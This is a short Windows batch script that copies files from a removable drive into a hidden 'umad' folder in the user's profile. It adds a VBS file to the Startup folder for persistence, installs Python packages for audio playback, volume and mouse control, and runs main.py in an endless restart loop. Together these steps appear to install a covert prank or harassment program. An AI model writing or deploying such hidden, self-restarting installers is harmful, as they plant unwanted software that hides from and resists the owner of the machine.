@echo off
mkdir C:\users\%USERNAME%\umad
attrib +h C:\users\%USERNAME%\umad /d /s
xcopy E:\umad C:\users\%USERNAME%\umad /v /q /c /y /e
copy Startup\startup_main.vbs C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup /v /y
echo installing dependencies
pip install pycaw
pip install comtypes
pip install playsound==1.2.2
pip install mouse
:restart
python C:\users\%USERNAME%\umad\main.py
goto :restart
